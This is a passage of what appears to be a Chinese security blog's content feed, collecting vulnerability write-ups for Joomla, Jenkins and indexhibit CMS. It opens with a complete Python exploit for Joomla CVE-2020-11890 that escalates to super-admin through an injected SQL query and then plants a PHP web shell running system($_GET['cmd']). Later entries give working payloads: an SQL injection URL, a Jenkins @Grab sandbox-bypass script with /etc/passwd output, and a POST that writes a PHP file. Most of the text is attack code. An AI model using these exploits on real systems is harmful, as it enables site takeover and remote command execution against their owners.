extract_token(resp)</span><br><span class="line">    if not token:</span><br><span class="line">        return False</span><br><span class="line">    print(&apos;[+] Logging in to Manager&apos;)</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;username&apos;: uname,</span><br><span class="line">        &apos;passwd&apos;: upass,</span><br><span class="line">        &apos;task&apos;: &apos;login&apos;,</span><br><span class="line">        token: &apos;1&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    resp = sess.post(admin_url, data=data, verify=True)</span><br><span class="line">    if &apos;task=profile.edit&apos; not in resp.text:</span><br><span class="line">        print(&apos;[!] Manager Login Failure!&apos;)</span><br><span class="line">        return None</span><br><span class="line">    print(&apos;[+] Manager Login Successfully!&apos;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_admin(sess, url):</span><br><span class="line">    url_check = url + &apos;/administrator/index.php?option=com_content&apos;</span><br><span class="line">    resp = sess.get(url_check, verify=True)</span><br><span class="line">    token = extract_token(resp)</span><br><span class="line">    if not token:</span><br><span class="line">        print &quot;[-] You are not Manager!&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line">    return token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getManagerId(url, sess):</span><br><span class="line">    url_get = url + &apos;/administrator/index.php?option=com_admin&amp;view=profile&amp;layout=edit&apos;</span><br><span class="line">    resp = sess.get(url_get, verify=True)</span><br><span class="line">    # get id</span><br><span class="line">    return re.findall(&apos;id=\d+&apos;, resp.text)</span><br><span class="line"></span><br><span class="line">def createNewField(url, sess,token):</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;jform[title]&apos;: &apos;SQL query&apos;,</span><br><span class="line">        &apos;jform[type]&apos;: &apos;text&apos;,</span><br><span class="line">        &apos;jform[name]&apos;: &apos;SQL query&apos;,</span><br><span class="line">        &apos;jform[label]&apos;: &apos;SQL query&apos;,</span><br><span class="line">        &apos;jform[description]&apos;: &apos;SQL query&apos;,</span><br><span class="line">        &apos;jform[required]&apos;: 1,</span><br><span class="line">        &apos;jform[state]&apos;: 1,</span><br><span class="line">        &apos;jform[group_id]&apos;: 0,</span><br><span class="line">        &apos;jform[access]&apos;: 1,</span><br><span class="line">        &apos;jform[language]&apos;: &apos;*&apos;,</span><br><span class="line">        &apos;jform[params][showlabel]&apos;: 1,</span><br><span class="line">        &apos;jform[params][display]&apos;: 2,</span><br><span class="line">        &apos;jform[params][display_readonly]&apos;: 2,</span><br><span class="line">        &apos;jform[id]&apos;: 0,</span><br><span class="line">        &apos;jform[context]&apos;: &apos;com_content.article&apos;,</span><br><span class="line">        &apos;task&apos;: &apos;field.apply&apos;,</span><br><span class="line">        token: 1</span><br><span class="line">    &#125;</span><br><span class="line">    resp = sess.post(url + &quot;/administrator/index.php?option=com_fields&amp;context=com_content.article&quot;, data=data, verify=True)</span><br><span class="line">    id = re.findall(&apos;id=\d+&apos;, resp.text)</span><br><span class="line">    id_account = getManagerId(url, sess)</span><br><span class="line">    ran = &apos;%d&apos; % random.randrange(1, 10000)</span><br><span class="line">    url_post = url + &apos;/administrator/index.php?option=com_fields&amp;context=com_content.article&amp;layout=edit&amp;&apos; + id[0]</span><br><span class="line">    newdata = &#123;</span><br><span class="line">        &apos;jform[title]&apos;: &apos;SQL query &apos; + ran,</span><br><span class="line">        &apos;jform[type]&apos;: &apos;sql&apos;,</span><br><span class="line">        &apos;jform[name]&apos;: &apos;SQL query &apos; + ran,</span><br><span class="line">        &apos;jform[label]&apos;: &apos;SQL query &apos; + ran,</span><br><span class="line">        &apos;jform[description]&apos;: &apos;SQL query&apos;,</span><br><span class="line">        &apos;jform[required]&apos;: 1,</span><br><span class="line">        &apos;jform[fieldparams][query]&apos;: &apos;UPDATE #__user_usergroup_map SET group_id = 8 WHERE user_&apos; + id_account[</span><br><span class="line">            0] + &apos; AND group_id BETWEEN 6 AND 7; &apos;,</span><br><span class="line">        &apos;jform[state]&apos;: 1,</span><br><span class="line">        &apos;jform[group_id]&apos;: 0,</span><br><span class="line">        &apos;jform[access]&apos;: 1,</span><br><span class="line">        &apos;jform[language]&apos;: &apos;*&apos;,</span><br><span class="line">        &apos;jform[params][showlabel]&apos;: 1,</span><br><span class="line">        &apos;jform[params][display]&apos;: 2,</span><br><span class="line">        &apos;jform[params][display_readonly]&apos;: 2,</span><br><span class="line">        &apos;jform[id]&apos;: id,</span><br><span class="line">        &apos;task&apos;: &apos;field.apply&apos;,</span><br><span class="line">        &apos;jform[context]&apos;: &apos;com_content.article&apos;,</span><br><span class="line">        token: 1</span><br><span class="line">    &#125;</span><br><span class="line">    newdata[&apos;task&apos;] = &apos;field.apply&apos;</span><br><span class="line">    sess.post(url_post, data=newdata, verify=True)</span><br><span class="line">    # Trigger SQL query</span><br><span class="line">    url_sql = url + &apos;/administrator/index.php?option=com_content&amp;view=article&amp;layout=edit&apos;</span><br><span class="line">    sess.get(url_sql, verify=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def checkSuperAdmin(url, sess):</span><br><span class="line">    print(&quot;[+] Checking Super-admin&quot;)</span><br><span class="line">    url_config = url + &apos;/administrator/index.php?option=com_config&apos;</span><br><span class="line">    resp = sess.get(url_config, verify=True)</span><br><span class="line">    results = re.findall(r&apos;name=&quot;([^&quot;]+)&quot;\s+[^&gt;]*?value=&quot;([^&quot;]+)&quot;&apos;, resp.text, re.S)</span><br><span class="line">    if not results:</span><br><span class="line">        print(&quot;[!] Fail!&quot; + &apos; You are not super-admin account&apos;)</span><br><span class="line">        return False</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[+] Done!&quot;</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rce(sess, url, cmd, token):</span><br><span class="line">    filename = &apos;error.php&apos;</span><br><span class="line">    shlink = url + &apos;/administrator/index.php?option=com_templates&amp;view=template&amp;id=506&amp;file=506&amp;file=L2Vycm9yLnBocA%3D%3D&apos;</span><br><span class="line">    shdata_up = &#123;</span><br><span class="line">        &apos;jform[source]&apos;: &quot;&lt;?php echo &apos;Hacked by HK\n&apos; ;system($_GET[&apos;cmd&apos;]); ?&gt;&quot;,</span><br><span class="line">        &apos;task&apos;: &apos;template.apply&apos;,</span><br><span class="line">        token: &apos;1&apos;,</span><br><span class="line">        &apos;jform[extension_id]&apos;: &apos;506&apos;,</span><br><span class="line">        &apos;jform[filename]&apos;: &apos;/&apos; + filename</span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(shlink, data=shdata_up)</span><br><span class="line">    path2shell = &apos;/templates/protostar/error.php?cmd=&apos; + cmd</span><br><span class="line">    # print &apos;[+] Shell is ready to use: &apos; + str(path2shell)</span><br><span class="line">    print &apos;[+] Checking:&apos;</span><br><span class="line">    shreq = sess.get(url + path2shell)</span><br><span class="line">    shresp = shreq.text</span><br><span class="line">    print shresp + &apos;[+] Shell link: \n&apos; + (url + path2shell)</span><br><span class="line">    print &apos;[+] Module finished.&apos;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # Construct the argument parser</span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    # Add the arguments to the parser</span><br><span class="line">    ap.add_argument(&quot;-url&quot;, &quot;--url&quot;, required=True,</span><br><span class="line">                    help=&quot; URL for your Joomla target&quot;)</span><br><span class="line">    ap.add_argument(&quot;-u&quot;, &quot;--username&quot;, required=True,</span><br><span class="line">                    help=&quot;username&quot;)</span><br><span class="line">    ap.add_argument(&quot;-p&quot;, &quot;--password&quot;, required=True,</span><br><span class="line">                    help=&quot;password&quot;)</span><br><span class="line">    ap.add_argument(&quot;-cmd&quot;, &quot;--command&quot;, default=&quot;whoami&quot;,</span><br><span class="line">                    help=&quot;command&quot;)</span><br><span class="line">    args = vars(ap.parse_args())</span><br><span class="line">    # target</span><br><span class="line">    url = format(str(args[&apos;url&apos;]))</span><br><span class="line">    print &apos;[+] Your target: &apos; + url</span><br><span class="line">    # username</span><br><span class="line">    uname = format(str(args[&apos;username&apos;]))</span><br><span class="line">    # password</span><br><span class="line">    upass = format(str(args[&apos;password&apos;]))</span><br><span class="line">    # command</span><br><span class="line">    command = format(str(args[&apos;command&apos;]))</span><br><span class="line">    # session</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    if not try_admin_login(sess, url, uname, upass): sys.exit()</span><br><span class="line">    token = check_admin(sess, url)</span><br><span class="line">    # trigger SQL query</span><br><span class="line">    createNewField(url, sess,token)</span><br><span class="line">    # Now you are Super-admin</span><br><span class="line">    if (checkSuperAdmin(url, sess)):</span><br><span class="line">        # call RCE</span><br><span class="line">        rce(sess, url, command, token)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/(CVE-2020-11890)JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/(CVE-2020-11890)JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="JoomlaRCE远程代码执行（CVE-2020-11890）"><a href="#JoomlaRCE远程代码执行（CVE-2020-11890）" class="headerlink" title="JoomlaRCE远程代码执行（CVE-2020-11890）"></a>JoomlaRCE远程代码执行（CVE-2020-11890）</h1><p>最后更新于：2020-09-23 16:18:31</p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Joomla! CMS versions 2.5.0 – 3.9.16版本在处理用户组时缺少对根用户组的检查，从而导致了一个提权漏洞的产生(CVE-2020-11890)。</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>CMS versions 2.5.0 - 3.9.16</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>链接：<a href="https://pan.baidu.com/s/1iDkl9dnCjIEXCJ1QvMLEeQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1iDkl9dnCjIEXCJ1QvMLEeQ</a><br>提取码：whu7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -2 1.py -url http://192.168.2.109/cms/ -u admin -p admin</span><br></pre></td></tr></table></figure><p><img src="./JoomlaRCE远程代码执行（CVE-2020-11890）/20200817154454910.png" alt="img"><br>给出了shell地址<br><img src="./JoomlaRCE远程代码执行（CVE-2020-11890）/20200817154515199.png" alt="img"></p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>升级到最新版</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/(CVE-2017-8917)Joomla_3.7.0_SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/(CVE-2017-8917)Joomla_3.7.0_SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Joomla-3-7-0-SQL注入-CVE-2017-8917"><a href="#Joomla-3-7-0-SQL注入-CVE-2017-8917" class="headerlink" title="Joomla! 3.7.0 SQL注入(CVE-2017-8917)"></a>Joomla! 3.7.0 SQL注入(CVE-2017-8917)</h1><h2 id="Official"><a href="#Official" class="headerlink" title="Official"></a>Official</h2><p><a href="https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html" target="_blank" rel="noopener">https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html</a></p><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917</a></p><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>Joomla! 3.7.0</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>直接访问,爆出数据库用户名：</p><pre><code>http://foo.com/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="http://blog.nsfocus.net/joomla-3-7-0-sql-injection-vulnerability/" target="_blank" rel="noopener">http://blog.nsfocus.net/joomla-3-7-0-sql-injection-vulnerability/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/(CVE-2017-8917)Joomla%203.7.0%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/(CVE-2017-8917)Joomla%203.7.0%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Joomla-3-7-0-SQL注入漏洞CVE-2017-8917"><a href="#Joomla-3-7-0-SQL注入漏洞CVE-2017-8917" class="headerlink" title="Joomla 3.7.0  SQL注入漏洞CVE-2017-8917"></a>Joomla 3.7.0  SQL注入漏洞CVE-2017-8917</h1><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>漏洞是由此Joomla 3.7.0 版本中引入的新组件（com_fields）带来的</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>cd /root/vulhub/joomla/CVE-2017-8917 docker-compose up -d <img src="./Joomla 3.7.0  SQL注入漏洞CVE-2017-8917/20200619122952854.png" alt> </p><p>启动后访问<a href="http://your-ip:8080即可看到Joomla的安装界面" target="_blank" rel="noopener">http://your-ip:8080即可看到Joomla的安装界面</a> 按照顺序安装即可 安装完成后，访问<a href="http://your-ip:8080/index.php?option=com\_fields&amp;view=fields&amp;layout=modal&amp;list\[fullordering\]=updatexml(0x23,concat(1,user()),1)，即可看到报错信息：" target="_blank" rel="noopener">http://your-ip:8080/index.php?option=com\_fields&amp;view=fields&amp;layout=modal&amp;list\[fullordering\]=updatexml(0x23,concat(1,user()),1)，即可看到报错信息：</a> <img src="./Joomla 3.7.0  SQL注入漏洞CVE-2017-8917/20200619123002609.png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/(CVE-2016-8869)Joomla_3.4.4-3.6.3_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/(CVE-2016-8869)Joomla_3.4.4-3.6.3_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="Joomla-3-4-4-3-6-3-未授权创建特权用户-CVE-2016-8869"><a href="#Joomla-3-4-4-3-6-3-未授权创建特权用户-CVE-2016-8869" class="headerlink" title="Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869)"></a>Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869)</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p>Joomla! 3.4.4 - 3.6.3</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>注意： 由于默认关闭注册功能，所以导致创建的管理员用户未激活无法使用。</p><p>测试：<br><img src="Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869" alt>/poc.png)</p><p>登录后台确认用户中增加了 Administrator 的一个用户：<br><img src="Joomla_3.4.4-3.6.3_未授权创建特权用户(CVE-2016-8869" alt>/poc_res.png)</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><p><a href="http://blog.knownsec.com/2016/10/joomla-register-cve-2016-8869/" target="_blank" rel="noopener">http://blog.knownsec.com/2016/10/joomla-register-cve-2016-8869/</a></p></li><li><p><a href="https://github.com/sunsunza2009/Joomla-3.4.4-3.6.4_CVE-2016-8869_and_CVE-2016-8870" target="_blank" rel="noopener">https://github.com/sunsunza2009/Joomla-3.4.4-3.6.4_CVE-2016-8869_and_CVE-2016-8870</a></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/jenkins/cve-2019-1003000-jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="PoC-Jenkins-RCE"><a href="#PoC-Jenkins-RCE" class="headerlink" title="PoC: Jenkins RCE"></a>PoC: Jenkins RCE</h1><h5 id="SECURITY-1266-CVE-2019-1003000-Script-Security-CVE-2019-1003001-Pipeline-Groovy-CVE-2019-1003002-Pipeline-Declarative"><a href="#SECURITY-1266-CVE-2019-1003000-Script-Security-CVE-2019-1003001-Pipeline-Groovy-CVE-2019-1003002-Pipeline-Declarative" class="headerlink" title="SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)"></a>SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</h5><blockquote><p>A proof of concept to allow users with Overall/Read permission and Job/Configure (and optional Job/Build) to bypass the sandbox protection and execute arbitrary code on the Jenkins master or node.</p></blockquote><blockquote><p><strong>Update</strong>: An article by <a href="https://twitter.com/orange_8361" target="_blank" rel="noopener">Orange Tsai</a> explaining the exploit chain utilizing CVE-2018-1000861 and CVE-2019-1003000 that bypass the need of Overall/Read permission for a pre-auth RCE:<br><a href="http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html" target="_blank" rel="noopener">http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html</a></p></blockquote><p><strong>具体文件见github</strong></p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</span><br><span class="line">$ <span class="built_in">cd</span> cve-2019-1003000-jenkins-rce-poc</span><br><span class="line">$ pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>Pass target url, job name, username/password credential, and system command to be executed, as arguments.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python exploit.py --url http://jenkins-site.com --job job_name --username your_user --password your_passwd --cmd <span class="string">"cat /etc/passwd"</span></span><br></pre></td></tr></table></figure></p><h2 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h2><p>Quoted from <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1667566" target="_blank" rel="noopener">Red Hat Bugzilla - Bug 1667566</a>:</p><blockquote><p>A flaw was found in Pipeline: Declarative Plugin before version 1.3.4.1, Pipeline: Groovy Plugin before version 2.61.1 and Script Security Plugin before version 1.50. Script Security sandbox protection could be circumvented during the script compilation phase by applying AST transforming annotations such as @Grab to source code elements. Both the pipeline validation REST APIs and actual script/pipeline execution are affected. This allowed users with Overall/Read permission, or able to control Jenkinsfile or sandboxed Pipeline shared library contents in SCM, to bypass the sandbox protection and execute arbitrary code on the Jenkins master or node. All known unsafe AST transformations in Groovy are now prohibited in sandboxed scripts.</p></blockquote><p>This PoC is using a user with Overall/Read and Job/Configure permission to execute a maliciously modified build script in sandbox mode, and try to bypass the sandbox mode limitation in order to run arbitraty scripts (in this case, we will execute system command).</p><p>As a background, Jenkins’s pipeline build script is written in groovy. This build script will be compiled and executed in Jenkins master or node, containing definition of the pipeline, e.g. what to do in slave nodes. Jenkins also provide the script to be executed in <em>sandbox mode</em>. In sandbox mode, all dangerous functions are blacklisted, so regular user cannot do anything malicious to the Jenkins server.</p><p>However, because the build script is written in Groovy, we can use any class or function in Java packages (However in sandbox mode, dangerous built-in ones are blacklisted). In this case, we are using AST transforming annotations <code>@Grab</code> to make jenkins import arbitrary java packages from external maven repository. In this PoC, I use <code>ProcBuilder</code> class defined in <code>org.buildobjects:jproc:2.2.3</code> in order to run system shell command.</p><p>The payload is defined as below:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import org.buildobjects.process.ProcBuilder</span><br><span class="line">@Grab(&apos;org.buildobjects:jproc:2.2.3&apos;)</span><br><span class="line">class Dummy&#123; &#125;</span><br><span class="line">print new ProcBuilder(&quot;/bin/bash&quot;).withArgs(&quot;-c&quot;,&quot;cat /etc/passwd&quot;).run().getOutputString()</span><br></pre></td></tr></table></figure></p><p>The script above will be compiled and executed in Jenkins master or node. After the job build is done, we can see the result of the shell command <code>cat /etc/passwd</code> in the job console output. Moreover, we can utilize this RCE to gain reverse shell, and literally <em>pwn</em> the Jenkins server!</p><h2 id="Example-Vulnerable-Site"><a href="#Example-Vulnerable-Site" class="headerlink" title="Example Vulnerable Site"></a>Example Vulnerable Site</h2><p>An example vulnerable jenkins is provided in this repository at directory <code>sample-vuln</code> in Docker container format. After booting up, the container image will have a jenkins site hosted on port tcp/8080, with a regular user with Overall/Read + Job/Configure + Job/Build permission with credential <code>user1:user1</code>, and pipeline job with id <code>my-pipeline</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> sample-vuln</span><br><span class="line">$ ./run.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line">$ python exploit.py --url http://localhost:8080 --job my-pipeline --username user1 --password user1 --cmd <span class="string">"cat /etc/passwd"</span></span><br><span class="line"></span><br><span class="line">[+] connecting to jenkins...</span><br><span class="line">[+] crafting payload...</span><br><span class="line">[+] modifying job with payload...</span><br><span class="line">[+] putting job build to queue...</span><br><span class="line">[+] waiting <span class="keyword">for</span> job to build...</span><br><span class="line">[+] restoring job...</span><br><span class="line">[+] fetching output...</span><br><span class="line">[+] OUTPUT:</span><br><span class="line">Started by user User 1</span><br><span class="line">Running <span class="keyword">in</span> Durability level: MAX_SURVIVABILITY</span><br><span class="line">[Pipeline] <span class="built_in">echo</span></span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/usr/lib/news:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/bin/sh</span><br><span class="line">man:x:13:15:man:/usr/man:/sbin/nologin</span><br><span class="line">postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin</span><br><span class="line">cron:x:16:16:cron:/var/spool/cron:/sbin/nologin</span><br><span class="line">ftp:x:21:21::/var/lib/ftp:/sbin/nologin</span><br><span class="line">sshd:x:22:22:sshd:/dev/null:/sbin/nologin</span><br><span class="line">at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin</span><br><span class="line">squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin</span><br><span class="line">xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin</span><br><span class="line">games:x:35:35:games:/usr/games:/sbin/nologin</span><br><span class="line">postgres:x:70:70::/var/lib/postgresql:/bin/sh</span><br><span class="line">cyrus:x:85:12::/usr/cyrus:/sbin/nologin</span><br><span class="line">vpopmail:x:89:89::/var/vpopmail:/sbin/nologin</span><br><span class="line">ntp:x:123:123:NTP:/var/empty:/sbin/nologin</span><br><span class="line">smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin</span><br><span class="line">guest:x:405:100:guest:/dev/null:/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/:/sbin/nologin</span><br><span class="line">jenkins:x:1000:1000:Linux User,,,:/var/jenkins_home:/bin/bash</span><br><span class="line"></span><br><span class="line">[Pipeline] End of Pipeline</span><br><span class="line">Finished: SUCCESS</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://jenkins.io/security/advisory/2019-01-08/" target="_blank" rel="noopener">Jenkins Security Advisory 2019-01-08</a></li><li><a href="https://github.com/jenkinsci/script-security-plugin/commit/2c5122e50742dd16492f9424992deb21cc07837c" target="_blank" rel="noopener">Jenkins upstream patch</a></li><li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1667566" target="_blank" rel="noopener">Red Hat Bugzilla - Bug 1667566</a></li><li><a href="https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin" target="_blank" rel="noopener">Jenkins Script Security Plugin</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>indexhibit cms v2.1.5 直接编辑php文件getshell</td><td>2019-02-20</td><td>yc（<a href="mailto:3365487579@qq.com" target="_blank" rel="noopener">3365487579@qq.com</a>）</td><td><a href="https://www.indexhibit.org/" target="_blank" rel="noopener">https://www.indexhibit.org/</a></td><td><a href="https://www.indexhibit.org/" target="_blank" rel="noopener">https://www.indexhibit.org/</a></td><td>v2.1.5</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8954" target="_blank" rel="noopener">CVE-2019-8954</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>indexhibit CMS 2.1.5版本存在一个直接编辑php文件的漏洞，导致getshell。   </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>当我们登录进后台后，向/ndxzstudio/?a=system<br>post数据：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upd_jxcode=true&amp;v=%253C%253Fphp%2520phpinfo()%253B%253F%253E&amp;id=%2Fcss%2Faudio.php</span><br></pre></td></tr></table></figure><blockquote><p>即可在/css/目录写入一个php文件audio.php。  </p></blockquote><blockquote><p>成功getshell：</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
